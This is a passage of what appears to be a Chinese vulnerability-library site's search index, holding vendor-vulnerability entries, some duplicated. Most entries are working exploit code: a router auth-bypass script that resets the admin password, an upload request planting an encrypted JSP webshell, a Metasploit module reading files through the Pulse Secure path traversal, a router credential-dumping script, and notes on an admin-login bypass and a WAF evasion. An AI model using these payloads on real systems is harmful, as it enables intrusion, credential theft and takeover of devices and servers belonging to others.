123456\" else : print \"[-] Some error!\" except Exception as e : print str ( e ) else : print \"error options!\" if __name__ == '__main__' : ip = sys . argv [ 1 ] exp ( ip )","title":"\u5929\u7ffc\u521b\u7ef4awifi\u8def\u7531\u5668\u5b58\u5728\u591a\u5904\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%94%B5%E4%BF%A1/%E5%A4%A9%E7%BF%BC%E5%88%9B%E7%BB%B4awifi%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%A4%9A%E5%A4%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 \u5929\u7ffc\u521b\u7ef4awifi\u8def\u7531\u5668\u5b58\u5728\u591a\u5904\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e 2019-06-01 H4lo http://www.skyworth.com/ http://www.skyworth.com/ Boa/0.94.14rc21 CVE-2019-12862","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%94%B5%E4%BF%A1/%E5%A4%A9%E7%BF%BC%E5%88%9B%E7%BB%B4awifi%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%A4%9A%E5%A4%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#poc","text":"#coding: utf-8 #__author__: H4lo import requests import sys payload = \"authflag=1\" UA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36\" headers = { \"User-Agent\" : UA , \"Cookie\" : payload } def exp ( ip ): info = \"\"\"1. Login with no password \\n 2. Change administrator's password \\n \"\"\" print info op = int ( raw_input ( \"Enter the options:\" )) if op == 1 : url = \"http://\" + str ( ip ) + \"/home.htm\" try : res = requests . get ( url , headers = headers , timeout = 5 ) if \"title.htm\" in res . text : print \"[+] The router is vulnerable\" else : print \"[-] The router is not vulnerable\" except Exception as e : print str ( e ) elif ( op == 2 ): url = \"http://\" + str ( ip ) + \"/boafrm/formAwifiSwitchSetup\" data = { \"olduserpass\" : \"1\" , \"newpass\" : \"123456\" , \"confirmnewpass\" : \"123456\" , \"submit-url\" : \"/password.htm\" } try : res = requests . post ( url = url , headers = headers , data = data , timeout = 5 ) if \"restartNow\" in res . text : print \"[+] Password had be changed to 123456\" else : print \"[-] Some error!\" except Exception as e : print str ( e ) else : print \"error options!\" if __name__ == '__main__' : ip = sys . argv [ 1 ] exp ( ip )","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/","text":"\u6f0f\u6d1e\u8be6\u60c5\uff1a \u7eff\u76df\u5168\u6d41\u91cf\u5a01\u80c1\u5206\u6790\u89e3\u51b3\u65b9\u6848\u9488\u5bf9\u539f\u59cb\u6d41\u91cf\u8fdb\u884c\u91c7\u96c6\u548c\u76d1\u63a7\uff0c\u5bf9\u6d41\u91cf\u4fe1\u606f\u8fdb\u884c\u6df1\u5ea6\u8fd8\u539f\u3001\u5b58\u50a8\u3001\u67e5\u8be2\u548c\u5206\u6790\uff0c\u53ef\u4ee5\u53ca\u65f6\u638c\u63e1\u91cd\u8981\u4fe1\u606f\u7cfb\u7edf\u76f8\u5173\u7f51\u7edc\u5b89\u5168\u5a01\u80c1\u98ce\u9669\uff0c\u53ca\u65f6\u68c0\u6d4b\u6f0f\u6d1e\u3001\u75c5\u6bd2\u6728\u9a6c\u3001\u7f51\u7edc\u653b\u51fb\u60c5\u51b5\uff0c\u53ca\u65f6\u53d1\u73b0\u7f51\u7edc\u5b89\u5168\u4e8b\u4ef6\u7ebf\u7d22\uff0c\u53ca\u65f6\u901a\u62a5\u9884\u8b66\u91cd\u5927\u7f51\u7edc\u5b89\u5168\u5a01\u80c1\uff0c\u8c03\u67e5\u3001\u9632\u8303\u548c\u6253\u51fb\u7f51\u7edc\u653b\u51fb\u7b49\u6076\u610f\u884c\u4e3a\uff0c\u4fdd\u969c\u91cd\u8981\u4fe1\u606f\u7cfb\u7edf\u7684\u7f51\u7edc\u5b89\u5168\u3002 \u7eff\u76df\u7efc\u5408\u5a01\u80c1\u63a2\u9488\u8bbe\u5907\u7248\u672cV2.0R00F02SP02\u53ca\u4e4b\u524d\u5b58\u5728\u6b64\u6f0f\u6d1e\u3002 \u5904\u7f6e\u610f\u89c1: \u5efa\u8bae\u5c3d\u5feb\u66f4\u65b0\u8865\u4e01\u81f3\u6700\u65b0\uff1a http://update.nsfocus.com/update/listBsaUtsDetail/v/F02 \u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\uff1a \u5bf9\u54cd\u5e94\u5305\u8fdb\u884c\u4fee\u6539\uff0c\u5c06false\u66f4\u6539\u4e3atrue\u7684\u65f6\u5019\u53ef\u4ee5\u6cc4\u9732\u7ba1\u7406\u7528\u6237\u7684md5\u503c\u5bc6\u7801 \u5229\u7528\u6e20\u9053\u7684md5\u503c\u53bb\u767b\u5f55\u9875\u9762 7ac301836522b54afcbbed714534c7fb \u6210\u529f\u767b\u5f55\uff0c\u767b\u5f55\u540e\u901a\u8fc7\u7ba1\u7406\u5458\u6743\u9650\u5bf9\u8bbe\u5907\u8fdb\u884c\u7ba1\u63a7\uff0c\u5e76\u4e14\u53ef\u4ee5\u770b\u5230\u5927\u91cf\u7684\u653b\u51fb\u4fe1\u606f\uff0c\u6cc4\u9732\u5185\u90e8\u7f51\u7edc\u5730\u5740\u5305\u62ec\u8d44\u4ea7\u7ba1\u7406\u3002","title":"\u7eff\u76dfUTS\u7efc\u5408\u5a01\u80c1\u63a2\u9488\u7ba1\u7406\u5458\u4efb\u610f\u767b\u5f55"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9FWAF%E7%BB%95%E8%BF%87/","text":"XFF\u4f2a\u9020\u5b57\u6bb5\u5730\u5740\u4e3a127.0.0.1\uff0c\u5bfc\u81f4waf\u4e0a\u770b\u4e0d\u2ec5\u653b\u51fb\u8005\u5730\u5740","title":"\u7eff\u76dfWAF\u7ed5\u8fc7"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E7%BD%91%E7%91%9E%E8%BE%BE/%E7%BD%91%E7%91%9E%E8%BE%BEwebvpn%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"\u4efb\u610f\u666e\u901a\u8d26\u6237\u767b\u9646\u8fdb\u7cfb\u7edf\u8bbf\u95ee1.1.1.1 @127 .0.0.1:8860 \u8fd4\u56de\u201cpong\"\u4ee3\u8868\u53ef\u4ee5\u8fdb\u884cRCE \u8fd4\u56de401\u4ee3\u8868\u4e0d\u53ef\u4ee5\uff08\u7528\u57df\u540d\u89e3\u6790\u5230127\u7ed5\u8fc7\uff09","title":"\u7f51\u745e\u8fbewebvpn\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%81%94%E8%BD%AF/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"POC \u00b6 POST /uai/download/uploadfileToPath.htm HTTP/1.1 HOST: xxxxx ... ... -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"input_localfile\"; filename=\"xxx.jsp\" Content-Type: image/png <%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*\u8be5\u5bc6\u94a5\u4e3a\u8fde\u63a5\u5bc6\u780132\u4f4dmd5\u503c\u7684\u524d16\u4f4d\uff0c\u9ed8\u8ba4\u8fde\u63a5\u5bc6\u7801rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"uploadpath\" ../webapps/notifymsg/devreport/ -----------------------------570xxxxxxxxx6025274xxxxxxxx1-- \u200b```![](https://www.bylibrary.cn/wp-content/uploads/2020/09/12.png) ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/13.png)","title":"\u8054\u8f6f\u51c6\u5165-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%81%94%E8%BD%AF/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#poc","text":"POST /uai/download/uploadfileToPath.htm HTTP/1.1 HOST: xxxxx ... ... -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"input_localfile\"; filename=\"xxx.jsp\" Content-Type: image/png <%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*\u8be5\u5bc6\u94a5\u4e3a\u8fde\u63a5\u5bc6\u780132\u4f4dmd5\u503c\u7684\u524d16\u4f4d\uff0c\u9ed8\u8ba4\u8fde\u63a5\u5bc6\u7801rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%> -----------------------------570xxxxxxxxx6025274xxxxxxxx1 Content-Disposition: form-data; name=\"uploadpath\" ../webapps/notifymsg/devreport/ -----------------------------570xxxxxxxxx6025274xxxxxxxx1-- \u200b```![](https://www.bylibrary.cn/wp-content/uploads/2020/09/12.png) ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/13.png)","title":"POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/","text":"CVE-2019-11510-1 \u00b6 Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510) \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 Pulse Secure Pulse Connect Secure\uff08\u53c8\u540dPCS\uff0c\u524d\u79f0Juniper Junos Pulse\uff09\u662f\u7f8e\u56fdPulse Secure\u516c\u53f8\u7684\u4e00\u5957SSL VPN\u89e3\u51b3\u65b9\u6848\u3002 Pulse Secure PCS 9.0RX\u7248\u672c\u30018.3RX\u7248\u672c\u548c8.2RX\u7248\u672c\u4e2d\u5b58\u5728\u6388\u6743\u95ee\u9898\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7f51\u7edc\u7cfb\u7edf\u6216\u4ea7\u54c1\u4e2d\u7f3a\u5c11\u8eab\u4efd\u9a8c\u8bc1\u63aa\u65bd\u6216\u8eab\u4efd\u9a8c\u8bc1\u5f3a\u5ea6\u4e0d\u8db3\u3002 python usage: \u00b6 python CVE-2019-11510.py https://x.x.x.x \u6f0f\u6d1eEXP(MSF\u7684ruby\u8bed\u8a00\u7684EXP) \u00b6 # Exploit Title: File disclosure in Pulse Secure SSL VPN (metasploit) # Google Dork: inurl:/dana-na/ filetype:cgi # Date: 8/20/2019 # Exploit Author: 0xDezzy (Justin Wagner), Alyssa Herrera # Vendor Homepage: https://pulsesecure.net # Version: 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4 # Tested on: Linux # CVE : CVE-2019-11510 require 'msf/core' class MetasploitModule < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient include Msf :: Post :: File def initialize ( info = {}) super ( update_info ( info , 'Name' => 'Pulse Secure - System file leak' , 'Description' => %q{ Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests. This exploit reads /etc/passwd as a proof of concept This vulnerability affect ( 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4 } , 'References' => [ [ 'URL' , 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510' ] ] , 'Author' => [ '0xDezzy (Justin Wagner), Alyssa Herrera' ] , 'License' => MSF_LICENSE , 'DefaultOptions' => { 'RPORT' => 443 , 'SSL' => true }, )) end def run () print_good ( \"Checking target...\" ) res = send_request_raw ({ 'uri' => '/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/' }, 1342 ) if res && res . code == 200 print_good ( \"Target is Vulnerable!\" ) data = res . body current_host = datastore [ 'RHOST' ] filename = \"msf_sslwebsession_\" + current_host + \".bin\" File . delete ( filename ) if File . exist? ( filename ) file_local_write ( filename , data ) print_good ( \"Parsing file.......\" ) parse () else if ( res && res . code == 404 ) print_error ( \"Target not Vulnerable\" ) else print_error ( \"Ooof, try again...\" ) end end end def parse () current_host = datastore [ 'RHOST' ] fileObj = File . new ( \"msf_sslwebsession_\" + current_host + \".bin\" , \"r\" ) words = 0 while ( line = fileObj . gets ) printable_data = line . gsub ( /[^[:print:]]/ , '.' ) array_data = printable_data . scan ( /.{1,60}/m ) for ar in array_data if ar != \"............................................................\" print_good ( ar ) end end #print_good(printable_data) end fileObj . close end end \u53c2\u8003\u94fe\u63a5\uff1a \u00b6 https://github.com/jas502n/CVE-2019-11510-1 https://hackerone.com/reports/591295 https://github.com/projectzeroindia/CVE-2019-11510 https://www.anquanke.com/vul/id/1589103","title":"CVE-2019-11510-1"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#cve-2019-11510-1","text":"","title":"CVE-2019-11510-1"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#exploit-for-arbitrary-file-read-on-pulse-secure-ssl-vpn-cve-2019-11510","text":"","title":"Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#_1","text":"Pulse Secure Pulse Connect Secure\uff08\u53c8\u540dPCS\uff0c\u524d\u79f0Juniper Junos Pulse\uff09\u662f\u7f8e\u56fdPulse Secure\u516c\u53f8\u7684\u4e00\u5957SSL VPN\u89e3\u51b3\u65b9\u6848\u3002 Pulse Secure PCS 9.0RX\u7248\u672c\u30018.3RX\u7248\u672c\u548c8.2RX\u7248\u672c\u4e2d\u5b58\u5728\u6388\u6743\u95ee\u9898\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u7f51\u7edc\u7cfb\u7edf\u6216\u4ea7\u54c1\u4e2d\u7f3a\u5c11\u8eab\u4efd\u9a8c\u8bc1\u63aa\u65bd\u6216\u8eab\u4efd\u9a8c\u8bc1\u5f3a\u5ea6\u4e0d\u8db3\u3002","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#python-usage","text":"python CVE-2019-11510.py https://x.x.x.x","title":"python usage:"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#expmsfrubyexp","text":"# Exploit Title: File disclosure in Pulse Secure SSL VPN (metasploit) # Google Dork: inurl:/dana-na/ filetype:cgi # Date: 8/20/2019 # Exploit Author: 0xDezzy (Justin Wagner), Alyssa Herrera # Vendor Homepage: https://pulsesecure.net # Version: 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4 # Tested on: Linux # CVE : CVE-2019-11510 require 'msf/core' class MetasploitModule < Msf :: Auxiliary include Msf :: Exploit :: Remote :: HttpClient include Msf :: Post :: File def initialize ( info = {}) super ( update_info ( info , 'Name' => 'Pulse Secure - System file leak' , 'Description' => %q{ Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests. This exploit reads /etc/passwd as a proof of concept This vulnerability affect ( 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4 } , 'References' => [ [ 'URL' , 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11510' ] ] , 'Author' => [ '0xDezzy (Justin Wagner), Alyssa Herrera' ] , 'License' => MSF_LICENSE , 'DefaultOptions' => { 'RPORT' => 443 , 'SSL' => true }, )) end def run () print_good ( \"Checking target...\" ) res = send_request_raw ({ 'uri' => '/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/' }, 1342 ) if res && res . code == 200 print_good ( \"Target is Vulnerable!\" ) data = res . body current_host = datastore [ 'RHOST' ] filename = \"msf_sslwebsession_\" + current_host + \".bin\" File . delete ( filename ) if File . exist? ( filename ) file_local_write ( filename , data ) print_good ( \"Parsing file.......\" ) parse () else if ( res && res . code == 404 ) print_error ( \"Target not Vulnerable\" ) else print_error ( \"Ooof, try again...\" ) end end end def parse () current_host = datastore [ 'RHOST' ] fileObj = File . new ( \"msf_sslwebsession_\" + current_host + \".bin\" , \"r\" ) words = 0 while ( line = fileObj . gets ) printable_data = line . gsub ( /[^[:print:]]/ , '.' ) array_data = printable_data . scan ( /.{1,60}/m ) for ar in array_data if ar != \"............................................................\" print_good ( ar ) end end #print_good(printable_data) end fileObj . close end end","title":"\u6f0f\u6d1eEXP(MSF\u7684ruby\u8bed\u8a00\u7684EXP)"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%84%89%E5%86%B2%E5%AE%89%E5%85%A8/CVE-2019-11510/#_2","text":"https://github.com/jas502n/CVE-2019-11510-1 https://hackerone.com/reports/591295 https://github.com/projectzeroindia/CVE-2019-11510 https://www.anquanke.com/vul/id/1589103","title":"\u53c2\u8003\u94fe\u63a5\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/","text":"\u524d\u8a00 \u00b6 \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e \u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e,\u5bc6\u7801 hash \u76f4\u63a5\u5b58\u653e\u5728\u7f51\u9875\u6e90\u7801\u91cc \u6f0f\u6d1e\u5371\u5bb3 \u00b6 \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732,\u53ef\u76f4\u63a5\u63a5\u7ba1\u8def\u7531\u5668 \u5f71\u54cd\u8303\u56f4 \u00b6 \u4ea7\u54c1 \u00b6 \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668 \u7248\u672c \u00b6 \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31 \u7ec4\u4ef6 \u00b6 \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee/index.htm?PAGE=web\u94fe\u63a5\uff0c\u6b64\u94fe\u63a5\u672a\u6388\u6743\u8bbf\u95ee\uff08\u91cc\u9762\u7684\u64cd\u4f5c\u9700\u8981\u8ba4\u8bc1\uff09\uff1a \u9009\u62e9`web\u8d26\u53f7\u7ba1\u7406\uff1a \u67e5\u770b\u6e90\u4ee3\u7801\u5373\u53ef\u83b7\u53d6\u5230\u767b\u5f55\u5bc6\u7801\u7684\u54c8\u5e0c\u503c\uff1a \u89e3\u5bc6\u54c8\u5e0c\u5373\u53ef\u83b7\u5f97\u5bc6\u7801\uff1a /login.html\u4ece\u6b64\u94fe\u63a5\u767b\u5f55\u7cfb\u7edf\uff1a POC \u00b6 from optparse import OptionParser import requests import json def getpass ( target ): r = requests . get ( target + '/action/usermanager.htm' ) #return r.text s = json . loads ( r . text ) s = str ( s [ 'rows' ]) s = s . replace ( \"[\" , \"\" ) s = s . replace ( \"]\" , \"\" ) s = s . replace ( \" \\' \" , \" \\\" \" ) s2 = json . loads ( s ) print ( \"\u8d26\u53f7:\" + s2 [ 'user' ] + \"\uff0c\u5bc6\u7801:\" + s2 [ 'pwd' ] + \" \\n \u767b\u5f55\u5730\u5740\u4e3a:\" + target + \"/login.html\" ) def main (): usage = \"usage: python3 %prog -t \u76ee\u6807(\u683c\u5f0f\uff1ahttp://1.1.1.1)\" parser = OptionParser ( usage = usage ) parser . add_option ( '-t' , dest = 'target' , type = 'string' , help = '\u76ee\u6807ip' ) ( options , args ) = parser . parse_args () target = options . target if target : getpass ( target ) if __name__ == \"__main__\" : main ()","title":"CVE 2019 16313 \u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_1","text":"\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e","title":"\u524d\u8a00"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_2","text":"\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732\u6f0f\u6d1e,\u5bc6\u7801 hash \u76f4\u63a5\u5b58\u653e\u5728\u7f51\u9875\u6e90\u7801\u91cc","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_3","text":"\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31\u5bc6\u7801\u6cc4\u9732,\u53ef\u76f4\u63a5\u63a5\u7ba1\u8def\u7531\u5668","title":"\u6f0f\u6d1e\u5371\u5bb3"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_4","text":"","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_5","text":"\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668","title":"\u4ea7\u54c1"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_6","text":"\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31","title":"\u7248\u672c"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_7","text":"\u8702\u7f51\u4e92\u8054\u4f01\u4e1a\u7ea7\u8def\u7531\u5668v4.31","title":"\u7ec4\u4ef6"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_8","text":"\u8bbf\u95ee/index.htm?PAGE=web\u94fe\u63a5\uff0c\u6b64\u94fe\u63a5\u672a\u6388\u6743\u8bbf\u95ee\uff08\u91cc\u9762\u7684\u64cd\u4f5c\u9700\u8981\u8ba4\u8bc1\uff09\uff1a \u9009\u62e9`web\u8d26\u53f7\u7ba1\u7406\uff1a \u67e5\u770b\u6e90\u4ee3\u7801\u5373\u53ef\u83b7\u53d6\u5230\u767b\u5f55\u5bc6\u7801\u7684\u54c8\u5e0c\u503c\uff1a \u89e3\u5bc6\u54c8\u5e0c\u5373\u53ef\u83b7\u5f97\u5bc6\u7801\uff1a /login.html\u4ece\u6b64\u94fe\u63a5\u767b\u5f55\u7cfb\u7edf\uff1a","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E8%9C%82%E7%BD%91/CVE-2019-16313%20%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4.31%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#poc","text":"from optparse import OptionParser import requests import json def getpass ( target ): r = requests . get ( target + '/action/usermanager.htm' ) #return r.text s = json . loads ( r . text ) s = str ( s [ 'rows' ]) s = s . replace ( \"[\" , \"\" ) s = s . replace ( \"]\" , \"\" ) s = s . replace ( \" \\' \" , \" \\\" \" ) s2 = json . loads ( s ) print ( \"\u8d26\u53f7:\" + s2 [ 'user' ] + \"\uff0c\u5bc6\u7801:\" + s2 [ 'pwd' ] + \" \\n \u767b\u5f55\u5730\u5740\u4e3a:\" + target + \"/login.html\" ) def main (): usage = \"usage: python3 %prog -t \u76ee\u6807(\u683c\u5f0f\uff1ahttp://1.1.1.1)\" parser = OptionParser ( usage = usage ) parser . add_option 